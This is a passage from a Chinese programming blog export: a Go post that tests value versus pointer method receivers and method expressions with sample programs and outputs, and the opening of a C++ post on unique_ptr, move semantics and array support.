class=\"comment\">./sameapi.go:12:6: method redeclared: Person.commapi</span></span><br><span class=\"line\"><span class=\"comment\">\tmethod(Person) func()</span></span><br><span class=\"line\"><span class=\"comment\">\tmethod(*Person) func()</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>报重定义错误，所以不能同时定义的，也就是说明receiver的类型不影响函数的定义，这两个算是同一个函数。那么我们可以猜测了，这两种形式其实是一样的，否则就是只在调用时对调用方有要求或者有差别。我们来验证下调用时有没有差别—能不能调以及是否传入的是同一个对象。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;unsafe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Person <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this Person)</span> <span class=\"title\">ObjectReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;ObjectReceiver Get:\\t%p\\n&quot;</span>, &amp;this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Person)</span> <span class=\"title\">PointerReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">&quot;PointerReceiver Get:\\t%p\\n&quot;</span>, this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">callingTest</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;sizeof Persion: %d\\n&quot;</span>,  unsafe.Sizeof(Person&#123;&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Object Calling&quot;</span>)</span><br><span class=\"line\">  obj := Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, &amp;obj)</span><br><span class=\"line\">  obj.ObjectReceiver()</span><br><span class=\"line\">  obj.PointerReceiver()</span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Pointer Calling&quot;</span>)</span><br><span class=\"line\">  ptr := &amp;Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, ptr)</span><br><span class=\"line\">  ptr.ObjectReceiver()</span><br><span class=\"line\">  ptr.PointerReceiver()\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tcallingTest()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">sizeof Persion: 0</span></span><br><span class=\"line\"><span class=\"comment\">Object Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">PointerReceiver Get:\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">Pointer Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">PointerReceiver Get:\t0x545f18</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br></pre></td></tr></table></figure>\n\n<p>我们看到，object调用object的receiver、object调用pointer的receiver、pointer调用object的receiver、pointer调用pointer的receiver得到的this指针都是同一个地址。所以我们得出结论，对象形式的receiver和指针形式的receiver没有任何差别，都是传递这个对象(对象本身或者其地址)进到函数中。</p>\n<p>结论对吗？？我们注意看<code>sizeof Persion: 0</code> ,对象的大小是0，所以即使对象发生了对象新建也还是可能在同一个地址的，不能说明问题。我们再来试一个对象大小非0的试试。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;unsafe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Person <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tany <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this Person)</span> <span class=\"title\">ObjectReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;ObjectReceiver Get:\\t%p\\n&quot;</span>, &amp;this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Person)</span> <span class=\"title\">PointerReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">&quot;PointerReceiver Get:\\t%p\\n&quot;</span>, this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">callingTest</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;sizeof Persion: %d\\n&quot;</span>,  unsafe.Sizeof(Person&#123;&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Object Calling&quot;</span>)</span><br><span class=\"line\">  obj := Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, &amp;obj)</span><br><span class=\"line\">  obj.ObjectReceiver()</span><br><span class=\"line\">  obj.PointerReceiver()</span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Pointer Calling&quot;</span>)</span><br><span class=\"line\">  ptr := &amp;Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, ptr)</span><br><span class=\"line\">  ptr.ObjectReceiver()</span><br><span class=\"line\">  ptr.PointerReceiver()\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tcallingTest()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">sizeof Persion: 8</span></span><br><span class=\"line\"><span class=\"comment\">Object Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0xc42008a020</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0xc42008a028</span></span><br><span class=\"line\"><span class=\"comment\">PointerReceiver Get:\t0xc42008a020</span></span><br><span class=\"line\"><span class=\"comment\">Pointer Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0xc42008a030</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0xc42008a038</span></span><br><span class=\"line\"><span class=\"comment\">PointerReceiver Get:\t0xc42008a030</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br></pre></td></tr></table></figure>\n\n<p>看到了吗，结果不一样了，所以上面的结论是错误的。我们来分析下这里发生了什么。</p>\n<p>可以看到调用PointerReceiver的函数时，进到函数的对象如论如何都是原始对象(或其地址)，也就是没有对象被新建。而调用ObjectReceiver的函数时，对象都是新建的，类似于值传递，发生了对象的复制，复制之后的内容跟原对象是一样的（浅拷贝），这个我就不贴验证浅拷贝的代码了。</p>\n<p>所以前面三脸懵逼的结论是：</p>\n<p>同名的PointerReceiver和ObjectReceiver不能重复定义；</p>\n<p>ObjectReceiver调用采用值传递会新建对象副本(浅拷贝)，PointerReceiver不会新建副本，并且支持交叉调用，object可以调用PointerReceiver， pointer也可以调用ObjectReceiver；</p>\n<p>当你希望函数调用不能改变当前对象，且不介意新建副本的开销，那么选择Object作为Receiver，其他都选择Pointer作为Receiver。</p>\n<h3 id=\"匪夷所思\"><a href=\"#匪夷所思\" class=\"headerlink\" title=\"匪夷所思\"></a>匪夷所思</h3><p>当我们已经沉浸在结论中陶醉欣喜时，新的测试让我们发出了Waht?的呐喊。我们对上面的代码稍作修改：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;unsafe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Person <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tany <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this Person)</span> <span class=\"title\">ObjectReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;ObjectReceiver Get:\\t%p\\n&quot;</span>, &amp;this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Person)</span> <span class=\"title\">PointerReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">&quot;PointerReceiver Get:\\t%p\\n&quot;</span>, this)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">callingTest</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;sizeof Persion: %d\\n&quot;</span>,  unsafe.Sizeof(Person&#123;&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Object Calling&quot;</span>)</span><br><span class=\"line\">  obj := Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, &amp;obj)</span><br><span class=\"line\">  (Person).ObjectReceiver(obj)</span><br><span class=\"line\">  <span class=\"comment\">//(Person).PointerReceiver(obj)</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fmt.Println(<span class=\"string\">&quot;Pointer Calling&quot;</span>)</span><br><span class=\"line\">  ptr := &amp;Person&#123;&#125;</span><br><span class=\"line\">  fmt.Printf(<span class=\"string\">&quot;origin: \\t\\t%p\\n&quot;</span>, ptr)</span><br><span class=\"line\">  (*Person).ObjectReceiver(ptr)</span><br><span class=\"line\">  (*Person).PointerReceiver(ptr)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tcallingTest()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***</span></span><br><span class=\"line\"><span class=\"comment\">sizeof Persion: 8</span></span><br><span class=\"line\"><span class=\"comment\">Object Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0xc42008a020</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0xc42008a028</span></span><br><span class=\"line\"><span class=\"comment\">Pointer Calling</span></span><br><span class=\"line\"><span class=\"comment\">origin: \t\t0xc42008a030</span></span><br><span class=\"line\"><span class=\"comment\">ObjectReceiver Get:\t0xc42008a038</span></span><br><span class=\"line\"><span class=\"comment\">PointerReceiver Get:\t0xc42008a030</span></span><br><span class=\"line\"><span class=\"comment\">***/</span></span><br></pre></td></tr></table></figure>\n\n<p>我们首先跟之前一样定义了两个函数</p>\n<p><code>func (this Person) ObjectReceiver()</code>和</p>\n<p><code>func (this *Person) PointerReceiver()</code>,</p>\n<p>接着我们分别尝试调用</p>\n<p><code>(Person).ObjectReceiver(obj)</code>, </p>\n<p><code>(Person).PointerReceiver(obj)</code>,</p>\n<p> <code>(*Person).ObjectReceiver(ptr)</code>, </p>\n<p><code>(*Person).PointerReceiver(ptr)</code></p>\n<p>(怎么样，没见过这么调用的吧，是不是很神奇)，神奇归神奇，这才是golang函数调用更本质的方式，叫做方法表达式（method expression）。<br><code>(Person).ObjectReceiver(obj)</code> 形式上等价于 <code>obj.ObjectReceiver()</code>.</p>\n<p><code>(Person).PointerReceiver(obj)</code> 形式上等价于 <code>obj.PointerReceiver()</code>.</p>\n<p><code>(*Person).ObjectReceiver(ptr)</code> 形式上等价于 <code>ptr.ObjectReceiver()</code>.</p>\n<p><code>(*Person).PointerReceiver(ptr)</code> 形式上等价于<code>ptr.PointerReceiver()</code>.</p>\n<p>我们发现，我们只定义了两种形式，但是我们却可以成功调用四中形式中的三种形式(其中<code>(Person).PointerReceiver(obj)</code>无法编译通过)。 也就是只有<code>obj.PointerReceiver()</code>的时候是失败的。但是根据我们上面好不容易得出的结论，这四种形式的调用应该都是没问题的呀。这又是为什么呢？</p>\n<h3 id=\"真相大白\"><a href=\"#真相大白\" class=\"headerlink\" title=\"真相大白\"></a>真相大白</h3><p>这里面是编译器在起作用，当我们定义了<code>func (this Person) ObjectReceiver()</code>的函数的时候，编译器就同时为我们生成了<code>func (*Person).ObjectReceiver()</code>的形式。当我们定义了<code>func (this *Person) PointerReceiver()</code>的时候，编译器却没有为我们定义<code>func (this Person) PointerReceiver()</code>的形式。</p>\n<p>这就是使用方法表达式的时候，无法通过object调用PointerReceiver的原因，因为没有定义这个形式的函数。</p>\n<p>那为什么前面测试的时候用普通的调用方式却是可以通过object调用PointerReceiver的呢？</p>\n<p>我前面提到方法表达式是一种更本质的函数调用方式，因此，编译器实际上是会把你的普通调用方式转换成方法表达式的，而为了照顾到我们平常经常使用到的用法，编译器在看到object.PointerReceiver()的时候就把它转换成(&amp;object).PointerReceiver()或者说是转换成了(*Person).PointerReceiver(&amp;object)的形式。</p>\n<p>编译器虽然为我们做了这种转换，但是他本质上是不同意这种用法的，除了这种直接的调用方式，别的调用方式下都是不会自动做转换的，比如方法表达式下不做转换，再比如通过接口调用也不会转换(其实还没到调用那一步，赋值那一步就因为没有自动生成对应的函数形式而报错)， 如下：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> speaker <span class=\"keyword\">interface</span> &#123;</span><br><span class=\"line\">\tspeak()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Person <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注意receiver类型</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Person)</span> <span class=\"title\">speak</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;it work&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意_speak类型</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> _speaker speaker = Person&#123;&#125;</span><br><span class=\"line\">\t_speaker.speak()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">./untitled.go:21:6: cannot use Person literal (type Person) as type speaker in assignment:</span></span><br><span class=\"line\"><span class=\"comment\">\tPerson does not implement speaker (speak method has pointer receiver)</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>那么为什么golang要禁止通过object调用PointerReceiver的呢，通过pointer调用ObjectReceiver为什么不一起禁了。</p>\n<p>这要从函数定义的目的说起，当你定义了函数<code>func (this Person) ObjectReceiver()</code>的时候，你是希望这个函数不会修改调用方那个对象的。那么如果<code>func (*Person).ObjectReceiver()</code>也不会修改调用方那个对象，golang自动生成这种形式就没什么风险，就可以生成。我们可以猜测这个函数的实现是</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Person)</span>.<span class=\"title\">ObjectReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t(Person).ObjectReceiver(*this)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当我们使用<code>(*Person).ObjectReceiver(ptr)</code>调用的时候，ptr传给this指针，不发生对象拷贝，接着执行<code>(Person).ObjectReceiver(*this)</code>，这个也就是我们定义的函数<code>func (this Person) ObjectReceiver()</code>。我们知道<code>(Person).ObjectReceiver(*this)</code>其实就是<code>(*this).ObjectReceiver()</code>的方法表达式形式，会发生对象拷贝。因此自动生成这种形式是等价的，没有副作用，都是会产生一次对象拷贝，不会修改调用方那个对象本身。</p>\n<p>同样当你定义了函数<code>func (this *Person) PointerReceiver()</code>,你是希望函数可以修改调用方那个对象的，如果<code>func (Person).PointerReceiver()</code>也会修改调用方那个对象，golang自动生成这种形式就没什么风险，就可以生成。我们可以猜测这个函数的实现是</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this Person)</span>.<span class=\"title\">PointerReceiver</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t(*Person).PointerReceiver(&amp;this)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当我们使用<code>(Person).PointerReceiver(obj)</code>调用的时候,obj传给this，发生一次对象拷贝，然后执行<code>(*Person).PointerReceiver(&amp;this)</code>, 这个也就是我们定义的函数<code>func (this *Person) PointerReceiver()</code>。我们知道<code>(*Person).PointerReceiver(&amp;this)</code>其实就是(&amp;this).PointerReceiver()，不发生对象拷贝。因此自动生成的这种形式总共发生一次对象拷贝，造成的结果就是这个函数修改的是副本的数据，修改不了调用方的那个对象。也就是不等价。</p>\n<p>所以golang不会自动为<code>func (this *Person) PointerReceiver()</code>生成<code>func (Person).PointerReceiver()</code>。</p>\n<p>我又是怎么知道这么高深的原理呢，请看官网的解释：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自 https://golang.org/doc/effective_go.html#pointers_vs_values</span><br><span class=\"line\"></span><br><span class=\"line\">The rule about pointers vs. values for receivers is that value methods can be invoked on pointers and values, but pointer methods can only be invoked on pointers.</span><br><span class=\"line\"></span><br><span class=\"line\">This rule arises because pointer methods can modify the receiver; invoking them on a value would cause the method to receive a copy of the value, so any modifications would be discarded. The language therefore disallows this mistake. There is a handy exception, though. When the value is addressable, the language takes care of the common case of invoking a pointer method on a value by inserting the address operator automatically. </span><br></pre></td></tr></table></figure>\n\n\n","categories":["代码"],"tags":["狗狼"]},{"title":"unique_ptr 特性和源码解析","url":"/2016/11/14/uniqueptr/","content":"<h2 id=\"C-中-unique-ptr-特性和源码解析\"><a href=\"#C-中-unique-ptr-特性和源码解析\" class=\"headerlink\" title=\"C++ 中 unique-ptr 特性和源码解析\"></a>C++ 中 unique-ptr 特性和源码解析</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>std::unique_ptr 包含在头文件&lt; memory &gt; 中，它被用来实现对动态分配对象的自动释放。</p>\n<p>这是一个在auto_ptr基础上发展并取代auto_ptr的类，所以它具有auto_ptr的自动释放特性以及独占控制权的特性，可以参考我之前关于auto_ptr的文章。最简单的用法如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"function\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">ap</span><span class=\"params\">(p)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么为什么unique_ptr要诞生来取代auto_ptr呢，首先为什么不是修改auto_ptr而要另起炉灶呢，这主要是不希望用一种静默的方式来修改它，从而使得你忽略了auto_ptr已经不是当初的auto_ptr了，以此来避免隐含bug而你却没意识到。</p>\n<p>另一个方面是unique_ptr比auto_ptr好在哪里， unique_ptr的出现是为了解决auto_ptr的两个问题，一个是静默的控制权转移问题，一个是不支持数组问题。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"显式的控制权转移\"><a href=\"#显式的控制权转移\" class=\"headerlink\" title=\"显式的控制权转移\"></a>显式的控制权转移</h3><p>控制权转移的问题看下面auto_ptr的例子，在例子中，ap1将控制权转移给了ap2,此时ap1中的指针已经是0，是无效地址。</p>\n<p>假如你不清楚auto_ptr的特性，你试着去操作ap1比如 ap1-&gt;inertValue++  ，这将导致致命的错误。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(p);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(ap1);</span><br><span class=\"line\"><span class=\"comment\">//或者</span></span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap2 = ap1;</span><br></pre></td></tr></table></figure>\n\n<p>涉及到两个函数：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">auto_ptr</span>(auto_ptr&amp; __a) <span class=\"keyword\">throw</span>() : _M_ptr(__a.<span class=\"built_in\">release</span>()) &#123; &#125;</span><br><span class=\"line\">auto_ptr&amp;</span><br><span class=\"line\"><span class=\"keyword\">operator</span>=(auto_ptr&amp; __a) <span class=\"built_in\"><span class=\"keyword\">throw</span></span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">reset</span>(__a.<span class=\"built_in\">release</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么unique_ptr就想着避免这种情况，于是它直接把这两个函数删掉了。。。</p>\n<p>取而代之的是两个非常类似的函数：（等下，你标题说的显式转移怎么没说？  等下，先转移个话题，后面会转回来）</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//只是把 unique_ptr&amp; __u 变成了unique_ptr&amp;&amp; __u而已嘛，</span></span><br><span class=\"line\"><span class=\"comment\">//咦？ &amp;&amp;是啥意思？</span></span><br><span class=\"line\"><span class=\"built_in\">unique_ptr</span>(unique_ptr&amp;&amp; __u)</span><br><span class=\"line\"></span><br><span class=\"line\">unique_ptr&amp;</span><br><span class=\"line\">   <span class=\"keyword\">operator</span>=(unique_ptr&amp;&amp; __u)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里你会发现他的参数类型不再是“引用”而是“引用引用”，有啥区别？  这个&amp;&amp;不同于引用类型&amp;也不是逻辑与，而是一种新的类型，也是c++11引入的，叫做右值引用，也就是说这个参数类型必须是个右值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">   这里插一段，右值时什么？我们在auto_ptr时遇到过，那时右值以临时变量的身份出现。</span><br><span class=\"line\">只是那时没这么叫他，那时也没有右值引用这么个符号出现</span><br><span class=\"line\"></span><br><span class=\"line\">简单点说，右值就是用完就会消失，你没法取到它地址的东西</span><br><span class=\"line\">比如</span><br><span class=\"line\">string left = string(&quot;1123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">这里left是个左值，因为我们能取到其地址，它也存在下来了没有消失，</span><br><span class=\"line\">而string(&quot;1123&quot;)是个临时存在的，用完即消失的变量，我们根本取不到他的地址，所以它是右值。</span><br><span class=\"line\">或者更简单点， 右值 ≈ 临时变量 。</span><br></pre></td></tr></table></figure>\n\n<p>那么为什么要支持临时变量作为构造参数呢，再回想一下auto_ptr中的关于auto_ptr_ref的例子。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1=auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>auto_ptr为了实现上面这种传递方式，特意创造出了一个辅助类auto_ptr_ref，这个类从不出现在一线的代码中。可见这是一种hack，一种workaround。</p>\n<p>那么到了unique_ptr中为了继续支持这种用法同时抛弃这种hack的方式，就使用了一个新的类型，右值引用，把参数类型进行高度的限制。这样下面的代码就依然是可以通过的：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1=unique_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(unique_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>好了，介绍了unique_ptr如何禁止控制权转移，那么如果我就是想转移呢，你为什么不让我转移？ 那就来看下它的显式转移方式吧（我说了我会转回来的吧）。</p>\n<p>c++11又通过产生新玩意来支持你的这种需求，它想出了一个std::move函数，可以把你的变量转成右值，只是属性上变成右值，并没有进行值的拷贝。于是控制权转移的代码如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(std::<span class=\"built_in\">move</span>(ap1));</span><br><span class=\"line\"><span class=\"comment\">//或者</span></span><br><span class=\"line\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt;ap2 = std::<span class=\"built_in\">move</span>(ap1);</span><br></pre></td></tr></table></figure>\n\n<p>这样一番折腾的好处是什么呢，是这么一折腾你就记住了，你这个ap1的控制权已经交出去了，可不能记错了啊！ 看到新的函数越来越多，隐约感到c++已经向着体量臃肿的路上一去不复返了。奔跑吧~~</p>\n<h3 id=\"支持数组\"><a href=\"#支持数组\" class=\"headerlink\" title=\"支持数组\"></a>支持数组</h3><p>unique_ptr是如何来支持数组类型的指针呢， 它是通过模板类的数组特化来实现的，也就是他首先实现了一个通用指针的版本，随后又再实现一个针对数组类型的版本，特化版本的实现优先级更高，所以如果构造时传入的参数是数组类型，就会走数组的特化版本。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/// unique_ptr for single objects.</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">typename</span> _Tp, <span class=\"keyword\">typename</span> _Dp = default_delete&lt;_Tp&gt; 